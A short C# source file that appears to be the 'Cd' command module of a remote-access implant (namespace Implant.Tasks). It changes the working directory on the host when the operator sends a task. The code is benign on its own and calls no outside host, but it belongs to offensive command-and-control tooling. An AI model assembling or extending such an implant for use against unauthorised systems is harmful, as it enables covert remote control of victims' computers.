using System;
using System.IO;

using Implant.Models;

namespace Implant.Tasks.Execute
{
    class Cd : ImplantCommands
    {
        private string path { get; set; }

        public override string Name => "Cd";

        public override string Execute(ImplantTask task)
        {
            try
            {
                path = task.Args;

                var currentDir = Directory.GetCurrentDirectory();

                if (path is null || path == ""){
                    path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                }

                if (path == ".."){
                    string[] dirArr = Directory.GetCurrentDirectory().ToString().Split('\\');
                    Array.Resize(ref dirArr, dirArr.Length - 1);
                    path = string.Join("\\", dirArr);
                }

                if (Directory.Exists($"{currentDir}\\{path}")) { path = $"{currentDir}\\{path}"; }
                
                Directory.SetCurrentDirectory(path);

                return $"[*] Path set to {Directory.GetCurrentDirectory()}\n";
            } catch (DirectoryNotFoundException) { return $"{path} is not a valid path\n"; }
        }
    }
}
